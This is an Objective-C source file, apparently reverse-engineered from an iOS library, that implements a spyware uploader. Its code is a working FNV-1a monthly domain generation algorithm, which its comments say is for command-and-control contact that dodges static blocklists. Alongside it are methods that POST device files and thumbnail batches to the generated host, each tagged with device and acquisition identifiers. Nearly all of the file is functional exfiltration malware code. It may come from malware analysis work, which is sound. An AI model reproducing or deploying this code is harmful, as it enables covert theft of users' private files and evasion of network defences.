// SimpleUploader.m - 远程上传器实现
// 逆向自 libappcore.dylib (SimpleUploader 类)
#import "upload/SimpleUploader.h"

@implementation SimpleUploader

- (instancetype)initWithBaseURL:(NSURL*)baseURL {
    self = [super init];
    if (self) {
        _baseURL = baseURL;
        _session = [NSURLSession sessionWithConfiguration:
            [NSURLSessionConfiguration ephemeralSessionConfiguration]];
        _acquisitionId = [[NSUUID UUID] UUIDString];
        _osVersion = [[UIDevice currentDevice] systemVersion];
        _bundleId = [[NSBundle mainBundle] bundleIdentifier] ?: @"unknown";
    }
    return self;
}

- (instancetype)initWithDGASeed:(uint32_t)seed {
    NSString* domain = [SimpleUploader currentMonthDomainWithSeed:seed];
    NSURL* url = [NSURL URLWithString:[NSString stringWithFormat:@"http://%@/", domain]];
    return [self initWithBaseURL:url];
}

#pragma mark - MonthlyCycleDGA

// 月度循环域名生成算法
// 算法: FNV-1a hash(year, month, seed) → 16进制字符串 → 域名
// 每月生成不同域名, 用于 C2 通信规避静态黑名单
+ (NSString*)generateDomainForYear:(int)year month:(int)month seed:(uint32_t)seed {
    // FNV-1a 哈希
    uint64_t hash = 1469598103934665603ULL;  // FNV offset basis
    uint8_t data[8];
    data[0] = (year >> 8) & 0xFF;
    data[1] = year & 0xFF;
    data[2] = month & 0xFF;
    data[3] = (seed >> 24) & 0xFF;
    data[4] = (seed >> 16) & 0xFF;
    data[5] = (seed >> 8) & 0xFF;
    data[6] = seed & 0xFF;
    data[7] = (year + month + seed) & 0xFF;  // 校验字节

    for (int i = 0; i < 8; i++) {
        hash ^= data[i];
        hash *= 1099511628211ULL;  // FNV prime
    }

    // 生成 12 字符的十六进制域名前缀
    const char* hex = "0123456789abcdef";
    char name[16];
    for (int i = 0; i < 12; i++) {
        name[i] = hex[(hash >> (i * 4)) & 0xF];
    }
    name[12] = '\0';

    // TLD 列表 (按月轮换)
    NSArray* tlds = @[@".com", @".net", @".org", @".info", @".biz",
                      @".xyz", @".top", @".club", @".online", @".site",
                      @".work", @".link"];
    NSString* tld = tlds[(month - 1) % tlds.count];

    return [NSString stringWithFormat:@"%s%@", name, tld];
}

+ (NSString*)currentMonthDomainWithSeed:(uint32_t)seed {
    NSCalendar* cal = [NSCalendar currentCalendar];
    NSDateComponents* comps = [cal components:NSCalendarUnitYear | NSCalendarUnitMonth
                                     fromDate:[NSDate date]];
    return [self generateDomainForYear:(int)comps.year month:(int)comps.month seed:seed];
}

- (void)uploadFile:(NSString*)filePath withType:(NSString*)type {
    NSURL* url = [NSURL URLWithString:[NSString stringWithFormat:@"upload/%@", type]
                          relativeToURL:_baseURL];
    NSMutableURLRequest* req = [self requestWithURL:url];

    NSData* fileData = [NSData dataWithContentsOfFile:filePath];
    req.HTTPBody = fileData;

    NSLog(@"Uploading file: %@ (type: %@, size: %lu)",
          filePath, type, (unsigned long)fileData.length);

    [[_session dataTaskWithRequest:req completionHandler:^(NSData* data,
                                                           NSURLResponse* response,
                                                           NSError* error) {
        if (error) {
            NSLog(@"Got error while sending data: %@", error);
        } else {
            NSLog(@"Upload complete: %@", filePath);
        }
    }] resume];
}

- (void)uploadThumbBatch:(NSArray*)thumbPaths {
    for (NSString* path in thumbPaths) {
        [self uploadFile:path withType:@"thumbnail"];
    }
}

- (void)uploadData:(NSData*)data withName:(NSString*)name type:(NSString*)type {
    NSURL* url = [NSURL URLWithString:[NSString stringWithFormat:@"upload/%@", type]
                          relativeToURL:_baseURL];
    NSMutableURLRequest* req = [self requestWithURL:url];
    req.HTTPBody = data;

    [[_session dataTaskWithRequest:req completionHandler:^(NSData* d,
                                                           NSURLResponse* r,
                                                           NSError* e) {
        if (e) NSLog(@"Got error while sending data.");
    }] resume];
}

- (NSMutableURLRequest*)requestWithURL:(NSURL*)url {
    NSMutableURLRequest* req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"POST";
    [req setTimeoutInterval:30];
    [req setValue:_osVersion forHTTPHeaderField:@"X-OS-Version"];
    [req setValue:_bundleId forHTTPHeaderField:@"X-Bundle-ID"];
    [req setValue:_acquisitionId forHTTPHeaderField:@"acquisition-id"];
    [req setValue:@"application/octet-stream" forHTTPHeaderField:@"Content-Type"];
    return req;
}

@end
